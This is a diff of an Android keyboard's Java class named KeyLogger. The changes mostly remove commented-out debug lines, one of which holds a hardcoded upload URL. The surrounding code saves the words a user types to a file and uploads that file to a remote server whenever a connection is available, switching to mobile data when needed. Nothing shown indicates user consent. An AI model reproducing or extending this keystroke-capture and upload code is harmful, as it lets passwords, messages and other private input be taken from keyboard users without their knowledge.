@@ -230,7 +230,7 @@ public class KeyLogger {
 		DataOutputStream outputStream = null;
 
 		String pathToOurFile = map;
-		String urlServer = stringUrl;// "http://idid.in/android/storeaway.php";
+		String urlServer = stringUrl;
 		String lineEnd = "\r\n";
 		String twoHyphens = "--";
 		String boundary = "*****";
@@ -324,7 +324,6 @@ public class KeyLogger {
 
 		try {
 			FileOutputStream fos = mSoftKeyboard.openFileOutput(map, Context.MODE_PRIVATE);
-			// Log.d(TAG,"Open fileos. Map length "+ht.size());
 
 			ObjectOutputStream osw = new ObjectOutputStream(fos);
 			osw.writeObject(ht);
@@ -333,22 +332,16 @@ public class KeyLogger {
 			osw.close();
 
 		} catch (FileNotFoundException e) {
-			// catch errors opening file
-			// e.printStackTrace();
 			Log.d(TAG, e.getMessage());
 
 		} catch (IOException e) {
-			// e.printStackTrace();
 			Log.d(TAG, e.getMessage());
-			// Toast.makeText(context, "calles", Toast.LENGTH_SHORT).show();
 		}
 
 	}
 
 	// deleteFile
 	public void deleteNamedFile(String filename) {
-		// Log.d(TAG,"Delete "+filename);
-
 		try {
 			File file = mSoftKeyboard.getBaseContext().getFileStreamPath(filename);
 			boolean status = file.delete();
@@ -367,13 +360,7 @@ public class KeyLogger {
 	// when connection available, upload to the server
 
 	public void uploadToServer() {
-		// get the text to upload
-		// String uploadText=readFromFile("swcLog.txt");
-		// String stringUrl = "http://idid.in/storeaway.php?words="+uploadText;
-		// String stringUrl = "http://idid.in/android/storeaway.php";
-		// System.out.println("Connecting to");
 		Log.d(TAG, "Connecting to " + stringUrl);
-		// System.out.println(stringUrl);
 		try {
 			ConnectivityManager connMgr = (ConnectivityManager) mSoftKeyboard.getSystemService(Context.CONNECTIVITY_SERVICE);
 			NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
@@ -383,9 +370,7 @@ public class KeyLogger {
 				Log.d(TAG, networkInfo.toString());
 				Log.d(TAG, "Apparently nw is available");
 				new SendStatsTask().execute(stringUrl);
-				// Log.d(TAG, "Apparently nw is available");
 			} else {
-				// System.out.println("No network connection available.");
 				Log.d(TAG, "No network connection available.");
 				connMgr.setNetworkPreference(ConnectivityManager.TYPE_MOBILE);
 				if (connMgr.getActiveNetworkInfo().isConnected()) {
@@ -419,22 +404,13 @@ public class KeyLogger {
 	public class SendStatsTask extends AsyncTask<String, Void, String> {
 		// @Override
 		protected String doInBackground(String... urls) {
-			// return downloadUrl(urls[0]);
-			// return sendLog();
-			// String uploadText=readFromFile("swcLog.txt");
-
-			// Log.d(TAG,"In thread..trying to connect..sending-"+uploadText);
 			Log.d(TAG, "In thread..trying to connect..sending-");
-			// return postData(urls[0],
-			// "postwords="+URLEncoder.encode(uploadText));
 			return uploadFile();
 		}
 
 		// onPostExecute displays the results of the AsyncTask.
 		@Override
 		protected void onPostExecute(String result) {
-			// textView.setText(result);
-			// System.out.println(result);
 			Log.d(TAG, "Result returned");
 			if (result.isEmpty()) {
 				Log.d(TAG, "Result string empty");
